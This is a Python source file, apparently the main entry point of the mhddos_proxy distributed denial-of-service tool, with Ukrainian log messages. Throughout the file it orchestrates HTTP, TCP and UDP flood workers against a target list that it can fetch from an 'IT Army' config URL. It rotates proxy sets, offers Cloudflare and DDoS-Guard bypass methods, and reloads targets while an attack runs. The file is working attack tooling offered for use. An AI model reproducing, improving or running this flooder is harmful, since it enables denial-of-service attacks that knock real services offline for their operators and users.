import asyncio
from contextlib import suppress

# @formatter:off
import colorama; colorama.init()
# @formatter:on
from itertools import cycle
import random
import time
from threading import Event, Thread
from typing import Any, Generator, Iterator, List, Optional

from src.cli import init_argparse
from src.concurrency import DaemonThreadPool
from src.core import logger, cl, LOW_RPC, IT_ARMY_CONFIG_URL, Params, Stats
from src.dns_utils import resolve_all_targets
from src.mhddos import async_main as mhddos_async_main
from src.output import show_statistic, print_banner, print_progress
from src.proxies import ProxySet
from src.system import fix_ulimits, is_latest_version
from src.targets import TargetsLoader


# XXX: having everything on the same thread means that we can create
#      priority queue for target (decreasing priority for "dead" targets)
class Flooder:

    def __init__(self, switch_after: int = 100):
        self._switch_after = switch_after
        self._runnables = None
        self._current_task = None

    def update_targets(self, runnables: Iterator[Any]):
        self._runnables = runnables
        if self._current_task is not None:
            self._current_task.cancel()
   
    async def loop(self):
        assert self._runnables is not None
        while True:
            runnable = next(self._runnables)
            for _ in range(self._switch_after):
                try:
                    self._current_task = asyncio.ensure_future(runnable.run())
                    if not (await self._current_task):
                        break
                except asyncio.CancelledError:
                    break
                except Exception:
                    break


# XXX: UDP
async def run_ddos(
    proxies: Optional[ProxySet],
    targets_loader,
    reload_after,
    rpc,
    http_methods,
    vpn_mode,
    debug,
    table,
    total_threads,
    udp_threads,
    switch_after,
):
    statistics = {}

    # initial set of proxies
    if proxies is not None:
        num_proxies = await proxies.reload()
        if num_proxies == 0:
            logger.error(f"{cl.RED}Не знайдено робочих проксі - зупиняємо атаку{cl.RESET}")
            exit()

    def register_params(params, container):
        thread_statistics = Stats()
        statistics[params] = thread_statistics
        kwargs = {
            'url': params.target.url,
            'ip': params.target.addr,
            'method': params.method,
            'rpc': int(params.target.option("rpc", "0")) or rpc,
            'event': None,
            'stats': thread_statistics,
            'proxies': proxies,
        }
        container.append(kwargs)
        if not (table or debug):
            logger.info(
                f'{cl.YELLOW}Атакуємо ціль:{cl.BLUE} %s,{cl.YELLOW} Порт:{cl.BLUE} %s,{cl.YELLOW} Метод:{cl.BLUE} %s{cl.RESET}'
                % (params.target.url.host, params.target.url.port, params.method)
            )

    logger.info(f'{cl.GREEN}Запускаємо атаку...{cl.RESET}')
    if not (table or debug):
        # Keep the docs/info on-screen for some time before outputting the logger.info above
        await asyncio.sleep(5)

    flooders = [Flooder(switch_after) for _ in range(total_threads)]
    udp_flooders = [Flooder(switch_after) for _ in range(udp_threads)]

    # XXX: might throw an exception
    async def load_targets():
        targets, changed = await targets_loader.load()
        # XXX: use async DNS resolver or offload properly
        targets = await resolve_all_targets(targets)
        return [target for target in targets if target.is_resolved], changed

    def install_targets(targets):
        kwargs_list, udp_kwargs_list = [], []
        for target in targets:
            assert target.is_resolved, "Unresolved target cannot be used for attack"
            # udp://, method defaults to "UDP"
            if target.is_udp:
                register_params(Params(target, target.method or 'UDP'), udp_kwargs_list)
            # Method is given explicitly
            elif target.method is not None:
                register_params(Params(target, target.method), kwargs_list)
            # tcp://
            elif target.url.scheme == "tcp":
                register_params(Params(target, 'TCP'), kwargs_list)
            # HTTP(S), methods from --http-methods
            elif target.url.scheme in {"http", "https"}:
                for method in http_methods:
                    register_params(Params(target, method), kwargs_list)
            else:
                raise ValueError(f"Unsupported scheme given: {target.url.scheme}")
        if kwargs_list:
            runnables_iter = cycle(mhddos_async_main(**kwargs) for kwargs in kwargs_list)
            for flooder in flooders:
                flooder.update_targets(runnables_iter)
        # XXX: there should be a better way to write this code
        if udp_kwargs_list:
            udp_runnables_iter = cycle(mhddos_async_main(**kwargs) for kwargs in udp_kwargs_list)
            for flooder in udp_flooders:
                flooder.update_targets(udp_runnables_iter)


    initial_targets, _ = await load_targets()
    if not initial_targets:
        logger.error(f'{cl.RED}Не вказано жодної цілі для атаки{cl.RESET}')
        exit()
    install_targets(initial_targets)

    tasks = [asyncio.ensure_future(f.loop()) for f in (flooders + udp_flooders)]

    async def stats_printer():
        refresh_rate = 5
        ts = time.time()
        while True:
            try:
                passed = time.time() - ts
                ts = time.time()
                num_proxies = 0 if proxies is None else len(proxies)
                show_statistic(
                    statistics,
                    refresh_rate,
                    table,
                    vpn_mode,
                    num_proxies,
                    reload_after,
                    passed
                )
            except Exception:
                ts = time.time()
            await asyncio.sleep(refresh_rate)

    # setup coroutine to print stats
    tasks.append(asyncio.ensure_future(stats_printer()))

    async def reload_targets(delay_seconds: int = 30):
        while True:
            try:
                await asyncio.sleep(delay_seconds)
                targets, changed = await load_targets()
                if not targets:
                    logger.warning(
                        f"{cl.RED}Не знайдено жодної доступної цілі - "
                        f"чекаємо {delay_seconds} сек до наступної перевірки{cl.RESET}"
                    )
                elif not changed:
                    logger.warning(
                        f"{cl.YELLOW}Перелік цілей не змінився - "
                        f"чекаємо {delay_seconds} сек до наступної перевірки{cl.RESET}"
                    )
                else:
                    install_targets(targets)
            except asyncio.CancelledError:
                raise
            except Exception as exc:
                logger.warning(f"{cl.MAGENTA}Не вдалося (пере)завантажити конфіг цілей{cl.RESET}")
            finally:
                logger.info(
                    f"{cl.YELLOW}Оновлення цілей через: "
                    f"{cl.BLUE}{delay_seconds} секунд{cl.RESET}"
                )
  
    # setup coroutine to reload targets (if configuration file is given)
    if targets_loader.dynamic:
        tasks.append(asyncio.ensure_future(reload_targets(delay_seconds=reload_after)))

    async def reload_proxies(delay_seconds: int = 30):
        while True:
            try:
                await asyncio.sleep(delay_seconds)
                num_proxies = await proxies.reload()
                if num_proxies == 0:
                    logger.warning(
                        f"{cl.MAGENTA}Буде використано попередній список проксі{cl.RESET}")
            except asyncio.CancelledError:
                raise
            except Exception as exc:
                pass
            finally:
                logger.info(
                    f"{cl.YELLOW}Оновлення проксей через: "
                    f"{cl.BLUE}{delay_seconds} секунд{cl.RESET}"
                )

    # setup coroutine to reload proxies
    if proxies is not None:
        tasks.append(asyncio.ensure_future(reload_proxies(delay_seconds=reload_after)))

    await asyncio.gather(*tasks, return_exceptions=True)


async def start(args, shutdown_event: Event):
    print_banner(args.vpn_mode)
    fix_ulimits()

    if args.table:
        args.debug = False

    for bypass in ('CFB', 'DGB'):
        if bypass in args.http_methods:
            logger.warning(
                f'{cl.RED}Робота методу {bypass} не гарантована - атака методами '
                f'за замовчуванням може бути ефективніша{cl.RESET}'
            )

    if args.rpc < LOW_RPC:
        logger.warning(
            f'{cl.YELLOW}RPC менше за {LOW_RPC}. Це може призвести до падіння продуктивності '
            f'через збільшення кількості перепідключень{cl.RESET}'
        )

    is_old_version = not await is_latest_version()
    if is_old_version:
        logger.warning(
            f"{cl.RED}! ЗАПУЩЕНА НЕ ОСТАННЯ ВЕРСІЯ - ОНОВІТЬСЯ{cl.RESET}: "
            "https://telegra.ph/Onovlennya-mhddos-proxy-04-16\n"
        )
    
    if args.itarmy:
        targets_loader = TargetsLoader([], IT_ARMY_CONFIG_URL)
    else:
        targets_loader = TargetsLoader(args.targets, args.config)

    # XXX: fix for UDP targets
    no_proxies = args.vpn_mode # or all(target.is_udp for target in targets)
    proxies = None if no_proxies else ProxySet(args.proxies)

    # XXX: with the current implementation there's no need to
    # have 2 separate functions to setups params for launching flooders
    reload_after = 300
    await run_ddos(
        proxies,
        targets_loader,
        reload_after,
        args.rpc,
        args.http_methods,
        args.vpn_mode,
        args.debug,
        args.table,
        args.threads,
        0, # XXX: get back to this functionality later args.udp_threads,
        args.switch_after,
    )
    shutdown_event.set()


# XXX: try uvloop when available
if __name__ == '__main__':
    args = init_argparse().parse_args()
    shutdown_event = Event()
    try:
        # run event loop in a separate thread to ensure the application
        # exists immediately after Ctrl+C
        Thread(target=lambda: asyncio.run(start(args, shutdown_event)), daemon=True).start()
        # we can do something smarter rather than waiting forever,
        # but as of now it's gonna be consistent with previous version
        shutdown_event.wait()
    except KeyboardInterrupt:
        logger.info(f'{cl.BLUE}Завершуємо роботу...{cl.RESET}')
